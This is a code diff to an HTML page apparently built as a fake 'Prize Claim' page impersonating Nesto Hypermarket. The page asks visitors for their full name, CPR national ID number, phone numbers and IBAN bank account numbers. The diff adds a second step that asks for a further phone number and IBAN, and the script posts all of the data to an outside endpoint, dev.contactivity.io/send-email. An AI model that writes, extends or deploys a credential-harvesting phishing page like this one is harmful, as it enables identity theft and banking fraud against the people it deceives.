@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Prize Claim - Nesto Hypermarket</title>
     <style>
+        /* Your CSS styles here */
         body {
             font-family: Arial, sans-serif;
             margin: 0;
@@ -113,6 +114,22 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+
+        /* Hide next button initially */
+        #next-button {
+            display: block; /* Show the next button initially */
+        }
+
+        /* Hide additional fields initially */
+        #phone2,
+        #account3 {
+            display: none;
+        }
+
+        /* Hide the claim button initially */
+        #claim-button {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -132,11 +149,13 @@
         <section id="prize-details">
             <form id="claim-form">
                 <input type="text" id="name" placeholder="Full Name" required>
-                <input type="tel" id="phone" placeholder="Phone Number" required>
                 <input type="number" id="cpr" placeholder="CPR Number" required>
-                <input type="text" id="account1" placeholder="IBAN Number for Account 1" required>
-                <input type="text" id="account2" placeholder="IBAN Number for Account 2" required>
-                <button type="submit">Claim Prize</button>
+                <input type="tel" id="phone" placeholder="Phone Number" required>
+                <input type="text" id="account1" placeholder="IBAN Number" required>
+                <button type="button" id="next-button">Next</button>
+                <input type="tel" id="phone2" placeholder="Second Phone Number" required>
+                <input type="text" id="account3" placeholder="Second IBAN Number" required>
+                <button type="submit" id="claim-button">Claim Prize</button>
                 <div class="loader" id="loader"></div>
             </form>
         </section>
@@ -147,6 +166,23 @@
     </div>
 
     <script>
+        const nextButton = document.getElementById('next-button');
+        const claimButton = document.getElementById('claim-button');
+
+        nextButton.addEventListener('click', function () {
+            // Hide current fields and buttons
+            document.getElementById('name').style.display = 'none';
+            document.getElementById('cpr').style.display = 'none';
+            document.getElementById('phone').style.display = 'none';
+            document.getElementById('account1').style.display = 'none';
+            nextButton.style.display = 'none';
+
+            // Show additional fields and claim button
+            document.getElementById('phone2').style.display = 'block';
+            document.getElementById('account3').style.display = 'block';
+            claimButton.style.display = 'block';
+        });
+
         document.getElementById('claim-form').addEventListener('submit', function (event) {
             event.preventDefault();
 
@@ -157,14 +193,16 @@
             const cpr = document.getElementById('cpr').value;
             const phoneNumber = document.getElementById('phone').value;
             const account1 = document.getElementById('account1').value;
-            const account2 = document.getElementById('account2').value;
+            const phone2 = document.getElementById('phone2').value;
+            const account3 = document.getElementById('account3').value;
 
             const formData = {
                 name: name,
                 phoneNumber: phoneNumber,
                 cpr: cpr,
                 account1: account1,
-                account2: account2
+                phone2: phone2,
+                account3: account3
             };
 
             fetch('https://dev.contactivity.io/send-email', {
